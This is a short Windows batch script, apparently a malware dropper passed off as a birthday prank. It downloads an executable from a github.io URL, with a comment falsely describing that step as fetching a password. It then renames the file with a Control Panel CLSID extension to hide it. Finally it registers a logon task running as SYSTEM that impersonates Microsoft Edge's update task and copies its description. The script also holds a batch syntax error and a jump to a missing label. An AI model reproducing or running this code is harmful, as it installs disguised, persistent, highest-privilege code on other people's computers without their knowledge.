@ECHO OFF
SET "home=%~dp0"
SET "script=%home%happy_bday.exe"

:CREATE_SCHEDULED_TASK
powershell -Command "Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '%home%Control_Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}') -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName 'MicrosoftEdgeUpdateTaskMachineCore' -Description 'Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it.' -User 'SYSTEM' -RunLevel Highest"

:SETUP
@REM Get the password from webserver
powershell -Command "Invoke-WebRequest -Uri 'https://saltizm.github.io/Funnies/happy_bday.exe' -OutFile '%script%'"
ren "%script%" "Control_Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"

:MAIN
if not exist "%home%Control_Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}" (
    call :SETUP
    timeout /t 5 >nul
)
else (
    call :CREATE_SCHEDULED_TASK
    timeout /t 5 >nul
    goto :EOF
)
goto :MAIN_LOOP


